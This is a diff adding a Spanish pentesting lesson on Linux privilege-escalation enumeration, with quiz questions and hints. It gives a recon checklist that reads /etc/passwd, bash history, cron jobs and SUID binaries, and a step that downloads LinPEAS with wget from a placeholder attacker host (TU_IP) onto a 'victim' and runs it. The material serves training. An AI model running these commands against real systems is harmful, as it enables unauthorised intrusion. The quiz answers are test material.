@@ -1,0 +1,65 @@
+---
+index: 1
+title: "Metodología: enumerar antes de explotar"
+questions:
+  - id: privesc-linux-t01-q01
+    prompt: "¿Qué script automatizado es EL estándar para enumerar vectores de privesc en Linux?"
+    hint: "LinPEAS. Su hermano para Windows: WinPEAS."
+    kind: text
+  - id: privesc-linux-t01-q02
+    prompt: "¿Qué comando muestra qué comandos puedes ejecutar como root sin password?"
+    hint: "Ya lo conociste: sudo -l"
+    kind: text
+  - id: privesc-linux-t01-q03
+    prompt: "Un script de enumeración tarda 2 minutos y te lista 15 vectores. ¿Por qué NO ejecutarlo a ciegas sin entender primero?"
+    hint: "Ruido, falsos positivos, y en prod puede tumbar servicios."
+    kind: choice
+    options:
+      - id: a
+        label: "No hay razón: siempre hay que ejecutarlo primero"
+      - id: b
+        label: "Genera ruido en logs, puede saturar el sistema, y sin entender los vectores no sabrás explotarlos"
+      - id: c
+        label: "Porque antivirus lo bloquea"
+      - id: d
+        label: "Porque solo funciona en Ubuntu"
+---
+
+## La primera regla: enumera sistemáticamente
+
+Tu primera shell en Linux como usuario limitado. Antes de lanzar exploits a ciegas:
+
+```bash
+# LA LISTA (de memoria — tu primer minuto en la máquina)
+whoami && id                    # quién soy, a qué grupos pertenezco
+sudo -l                         # ¿qué puedo hacer como root?
+find / -perm -4000 -type f 2>/dev/null   # SUID binaries
+cat /etc/crontab                # tareas programadas
+ls -la /etc/cron*               # scripts de cron
+find / -writable -type f 2>/dev/null | grep -v proc   # escribibles
+cat /etc/passwd | grep -v nologin    # usuarios con shell
+ss -tulpn                        # puertos internos escuchando
+history && cat ~/.bash_history   # ¿qué hizo el admin?
+```
+
+## LinPEAS: el automatizador
+
+```bash
+# Descárgalo en tu máquina y pásalo a la víctima
+python3 -m http.server 8080    # en tu máquina
+wget http://TU_IP:8080/linpeas.sh -O /tmp/linpeas.sh   # en la víctima
+chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
+```
+
+LinPEAS resalta en ROJO/AMARILLO los vectores probables. Pero **entiende lo que te
+muestra** — en un informe necesitas explicar CÓMO escalaste, no solo que un script
+lo dijo.
+
+## La metodología en 3 pasos (siempre igual)
+
+1. **¿Quién soy y qué tengo?** (id, grupos, home, permisos)
+2. **¿Qué puedo tocar que root usa?** (SUID, sudo, cron, servicios, PATH)
+3. **¿Qué herramienta tiene GTFOBins?** (binarios con bypass documentado)
+
+GTFOBins.sh es tu referencia: binarios Unix que se pueden explotar para escalada
+cuando tienen SUID o se pueden ejecutar con sudo.
